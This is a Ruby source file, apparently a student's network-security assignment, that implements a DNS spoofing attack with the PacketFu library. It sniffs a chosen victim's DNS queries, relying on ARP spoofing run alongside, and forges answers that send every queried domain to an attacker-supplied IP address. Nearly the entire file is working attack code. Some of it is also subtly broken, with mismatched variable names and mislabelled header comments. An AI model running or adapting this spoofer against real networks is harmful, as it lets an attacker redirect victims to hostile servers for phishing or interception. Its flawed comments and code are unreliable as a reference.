#!/usr/bin/env ruby
# ================================================================================================ 
# dns.rb
# 
# Andrew Maledy
# COMP 8505 - Assignment 3
# 
# The class which will handle our dns spoofing. A little more complicated as all we have is 
# a udp packet. See http://www.networksorcery.com/enp/protocol/dns.htm for more information
# on the DNS protocol header.
#
# ================================================================================================
require 'rubygems'
require 'packetfu'

class DNS

	@spoof_ip = ''
	@victim_ip = ''
	@victim_mac
	@ifname = ''
	@ifconfig = ''
	# ============================================================================================
	# Initialize() (constructor)
	# 
	# Initialize the class with an arp packet
	#
	# ============================================================================================   
   def initialize(spoof_ip, victim_ip, iface = "em1", spoof = false)
        @spoof_ip = spoof_ip
        @victim_ip = victim_ip
        @victim_mac = PacketFu::Utils.arp(victim_ip, :iface => iface) #because we only want to attack one host
        @iface = iface
        @ifconfig = PacketFu::Utils.whoami?(:iface => iface)
        

    end 

    # ============================================================================================
	# Spoof()
	# 
	# Starts the rather complex spoofing process of listening for requests, grabbing packets
	# and responding on behalf of the DNS server.
	#
	# ============================================================================================	
	def spoof()
		listen()

		listen()
	end
	# ============================================================================================	
	# Listen
	#
	# Listens for DNS packets and when found, returns the packet. Make sure you're arp spoofing
	# at this point! (In another thread)
	#
	# ============================================================================================	

	def listen()
		
		puts "Listening for dns traffic..."
		#setup the filter to only grab dns traffic from the victim
		filter = "udp and port 53 and src " + @victim_ip

		# Start packet sniffing
        cap = PacketFu::Capture.new(:iface => @ifname, :start => true,
                        :promisc => true, :filter => filter, :save => true)
        cap.stream.each do |pkt|

        	 if PacketFu::UDPPacket.can_parse?(pkt) then
                packet = PacketFu::Packet.parse(pkt)

                dns_type = packet.payload[2].unpack('h*')[0].chr + \
                           packet.payload[3].unpack('h*')[0].chr

					if dns_type == '10' #not really ten, rather 1-0 (binnary) flag
						puts "DNS Packet"
						domain_name = extract_domain_name(packet.payload[12..-1])	
            
					     # Check if domain name field is empty
                        if domain_name.nil? then
                            puts "Empty domain name field"
                            next
                        end # domain_name.nil?

                        send_response(packet, domain_name)
                    end
             end # UDPPacket.can_parse?
        end #end packet capturing
    end

	# ============================================================================================	
	# Extract_domain_name
	#
	# Gets the domain name from a DNS packet.
	#
	# ============================================================================================	
	def extract_domain_name(payload)
		domain_name = ""

        while(true)
        	
        	 len = payload[0].unpack('H*')[0].to_i
        	 # to understand below you might need to read up on dns packets. they take the form of [length][string][length][string][...]0
        	 if len > 0 then #length of the first segment of the dns name
                domain_name += payload[1, len] + "." #grab the first chunk from the begining, until the length specified by the packet
                payload = payload[len + 1..-1]
            else
                domain_name = domain_name[0, domain_name.length - 1] # -1 to truncate the 0 at the end of the payload
            	puts domain_name #testing
                return domain_name
         	
            end # if len != 0 then
        end
	end
	# ============================================================================================	
	# Extract_domain_name
	#
	# Gets the domain name from a DNS packet.
	#
	# ============================================================================================	
	def send_response(packet, domain_name)

 		dns_packet = PacketFu::UDPPacket.new(:config => @cfg)
        
        dns_packet.udp_src   = packet.udp_dst
        dns_packet.udp_dst   = packet.udp_src
        dns_packet.eth_daddr = @victim_mac
        dns_packet.ip_daddr  = @victim_ip
        dns_packet.ip_saddr  = packet.ip_daddr
        dns_packet.payload   = packet.payload[0, 2] #identification from the packet that came in (these have to match)
		# Set the fields for the DNS protocol
      	dns_packet.payload += "\x81\x80"  #QR
      	dns_packet.payload += "\x00\x01"  # OPCode
      	dns_packet.payload +=  "\x00\x01" #Flags
        dns_packet.payload += "\x00\x00" #Z
        dns_packet.payload += "\x00\x00" #RCode

       
        #iterate through each domain name part and put the length and the data into the packet
        domain_name.split('.').each do |part|
            dns_packet.payload += part.length.chr
            dns_packet.payload += part
        end # @domain_name.split('.').each do |part|
        dns_packet.payload += "\x00\x00\x01\x00" 
        dns_packet.payload += "\x01\xc0\x0c\x00"
        dns_packet.payload += "\x01\x00\x01\x00" 
        dns_packet.payload += "\x00\x1b\xf9\x00" 
        dns_packet.payload +=  "\x04"	
        # Now send back the fake address
        
        spoof_ip = @spoof_ip.split('.')
        dns_packet.payload += [spoof_ip[0].to_i, spoof_ip[1].to_i, spoof_ip[2].to_i, spoof_ip[3].to_i].pack('c*')        
        
        #recalculate the checksum and send back the packet to the sender
        dns_packet.recalc()
        dns_packet.to_w(@ifname)
        puts dns_packet.payload
	end
end

